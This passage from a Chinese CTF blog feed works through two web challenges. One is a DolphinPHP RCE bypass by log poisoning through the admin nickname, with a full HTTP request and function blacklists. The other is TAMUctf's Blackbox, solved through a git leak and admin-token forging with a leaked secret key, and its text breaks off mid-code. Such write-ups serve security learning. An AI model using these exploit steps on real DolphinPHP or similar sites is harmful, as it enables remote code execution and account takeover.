href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 海豚PHP框架 [ DolphinPHP ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 版权所有 2016~2019 广东卓锐软件有限公司 [ http://www.zrthink.com ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 官方网站: http://dolphinphp.com</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 拒绝ie访问</span></span><br><span class="line">    <span class="string">&#x27;deny_ie&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 模块管理中，不读取模块信息的目录</span></span><br><span class="line">    <span class="string">&#x27;except_module&#x27;</span> =&gt; [<span class="string">&#x27;common&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;extra&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;install&#x27;</span>],</span><br><span class="line">    <span class="comment">// 禁用函数</span></span><br><span class="line">    <span class="string">&#x27;disable_functions&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chroot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chgrp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_alter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_restore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;openlog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;syslog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;symlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popepassthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505215639032.png" alt="image-20230505215639032"></p><p>直接去查看官方发布的补丁就行了</p><p>CVE-2023-0935 是使⽤ shell_exec 绕过 CVE-2021-46097 2. 根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。 然后使⽤登录管理⻔⼾ 在这个挑战中，shell_exec 被添加到 system.php 中的 disable_functions，以及 php.ini 下⾯的其他函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini</span><br><span class="line">_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp</span><br><span class="line">id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w</span><br><span class="line">exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er</span><br><span class="line">ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_</span><br><span class="line">getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv</span><br></pre></td></tr></table></figure><p>我们的⽬标是基于 CVE-2021-46097 再次绕过它</p><p>这里的话就是个小0day了，得自己挖利用链了  <strong>(第一次遇到得自己挖0day的题)</strong></p><p>我们可以通过更改昵称来完全控制 <strong>$details</strong>（此处为 get_nickname(UID)）。action_name 为 “user_edit”。</p><p><img src="../images/image-20230506222438638.png" alt="image-20230506222438638"></p><p>修改名称</p><p><img src="../images/image-20230506222544278.png" alt="image-20230506222544278"></p><p>Thinkphp 框架在 Loader.php 中定义了⼀个名为 include_file 的函数</p><p><img src="../images/image-20230506222655072.png" alt="image-20230506222655072"></p><p>所以我们可以将think__include_file作为第⼀个参数传递给call_user_func。</p><p>奇怪的是，thinkphp在./runtime下记录了SQL⽇志，⽽我们刚才做的是修改admin的昵称。昵称先被拼接成⼀条SQL命令，然后记 录到⽇志中。</p><p><img src="../images/image-20230506225333824.png" alt="image-20230506225333824"></p><p><img src="../images/image-20230506225655306.png" alt="image-20230506225655306"></p><p>2.编辑admin的昵称，使⽇志⽂件包含我们的webshell。</p><p>3.擦除缓存。这⼀步是必须的，否则昵称不会更新。</p><p><img src="../images/image-20230506230530708.png" alt="image-20230506230530708"></p><p>将昵称编辑为../runtime/2023/05/01.log。我们可以通过发送这样的请求来执⾏PHP代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/admin/index/profile.html HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 114</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Referer: http://localhost/admin.php/admin/index/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;</span><br><span class="line">PHPSESSID=88h9tlthje0nfe2sod7c8v6e39</span><br><span class="line">Connection: close</span><br><span class="line">__token__=d8c89447445b0095fb569725f91f0505&amp;nickname=../runtime/log/202304/29.log</span><br><span class="line">&amp;email=&amp;password=&amp;mobile=&amp;avatar=0&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>最后改命令来拿flag就行了</p><p><strong>难坏了</strong>   <strong>居然得自己分析源码来拿链子</strong>。。。。。。。</p><p>这里的话java还有好多东西没看  所以java题就先不进行复现了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的复现都是去网上搜索前几名发的wp来复现的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;amp;mid=2247486967&amp;amp;idx=1&amp;amp;sn=ad55ddd11c6</summary>
      
    
    
    
    
    <category term="AntCTF x D³CTF" scheme="https://ke1nys.github.io/tags/AntCTF-x-D%C2%B3CTF/"/>
    
  </entry>
  
  <entry>
    <title>TAMUctf 2023-web-复现</title>
    <link href="https://ke1nys.github.io/posts/662b134b.html"/>
    <id>https://ke1nys.github.io/posts/662b134b.html</id>
    <published>2023-05-01T06:06:14.000Z</published>
    <updated>2023-05-03T12:37:29.077Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/tamuctf/tamuctf-2023/tree/master/web">官方wp地址</a></p><p><a href="https://velog.io/@sani/TAMU-CTF-writeups">韩国老外的wp</a></p><h2 id="Blackbox"><a href="#Blackbox" class="headerlink" title="Blackbox"></a>Blackbox</h2><p><img src="../images/image-20230501140913517.png" alt="image-20230501140913517"></p><p>这里的话访问会报错，就是个文件包含，然后可以尝试用伪协议进行读取文件内容</p><p><img src="../images/image-20230501141309538.png" alt="image-20230501141309538"></p><p>扫目录的时候发先git源码泄露  于是使用githack工具去看能否读取到一些东西</p><p><img src="../images/image-20230501142033211.png" alt="image-20230501142033211"></p><p>读取到了文件，然后并下载下来了</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$resource</span> = <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./util.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(INCLUDE_DIR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$resource</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>util.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_login</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT key FROM users WHERE username=:uname AND password=:passwd;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:passwd&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">try_auth</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$hash_password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">db_login</span>(<span class="variable">$username</span>, <span class="variable">$hash_password</span>)-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_guest_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)), <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_admin_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$user_key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="variable">$user_key</span>, <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>)[<span class="number">0</span>]), <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_key</span> = <span class="variable">$data</span>[<span class="string">&#x27;user_key&#x27;</span>];</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable">$data</span>[<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username=:uname AND key=:ukey;&#x27;</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:ukey&#x27;</span>, <span class="variable">$user_key</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>() != <span class="literal">false</span> &amp;&amp; <span class="variable">$admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501142551816.png" alt="image-20230501142551816"></p><p>因为index.php里面有config.php所以就下载下来查看</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">APP_NAME</span> = <span class="string">&#x27;Blackbox&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INCLUDE_DIR</span> = <span class="string">&#x27;./templates/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DB_FILE</span> = <span class="string">&#x27;../sqlite/site-data.db&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_guest_token</span>(), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">try_auth</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_admin_token</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;main&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">page</span>=<span class="title">login</span>&quot;, <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(<span class="title">INCLUDE_DIR</span> . &#x27;<span class="title">footer</span>.<span class="title">php</span>&#x27;); ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>]) || !<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=login&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">  &lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>); <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;footer.php&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合上面的代码就可以发现只要<code>auth_token</code>能判定为管理员的话，就可以跳转到?page=admin  </p><p>所以接先去login页面拿到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0IiwidXNlcl9rZXkiOiJlZGEzNTBkYjFiNzk3NjRiIiwiYWRtaW4iOnRydWV9.fab86457458d9707b051bc8bb7619e8c</span><br></pre></td></tr></table></figure><p>然后进行解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;user_key&quot;:&quot;eda350db1b79764b&quot;,&quot;admin&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>这里的话伪造的话就很关键了，user_key的话要成功伪造成admin的user_key，所以git源码泄露的数据库就有用了</p><p><img src="../images/image-20230501143637851.png" alt="image-20230501143637851"></p><p>查看这个数据库就会发现有个admin的user_key</p><p>然后进行修改使用</p><p>然后结合util.php里的代码进行使用</p><p>就是生成加密字符串后面的签名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 